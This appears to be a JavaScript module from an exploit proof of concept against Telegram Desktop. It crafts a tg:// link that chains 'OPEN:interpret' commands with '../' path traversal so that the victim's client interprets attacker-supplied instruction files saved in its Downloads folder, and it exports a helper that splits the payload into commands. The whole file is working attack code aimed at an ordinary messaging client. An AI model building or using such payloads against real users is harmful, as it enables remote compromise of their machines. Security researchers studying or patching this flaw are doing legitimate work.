// Builds the tg:// payload that drives the whole chain.
//
// Format:
//   tg://x?a=1;OPEN:interpret:<encoded path 1>;OPEN:interpret:<encoded path 2>...
//
// Paths point at instruction files inside the victim's
// Downloads\Telegram Desktop\ folder, relative to the client's
// working directory.

const DOWNLOADS_PREFIX = '../../../Downloads/Telegram%20Desktop/';

function craftRedirect(files) {
  const commands = files.map(
    (name) => `OPEN:interpret:${DOWNLOADS_PREFIX}${encodeURIComponent(name)}`
  );
  return `tg://x?a=1;${commands.join(';')}`;
}

// Split a payload back into the individual commands the running
// client would consume.
function splitCommands(payload) {
  return payload.split(';');
}

module.exports = { DOWNLOADS_PREFIX, craftRedirect, splitCommands };
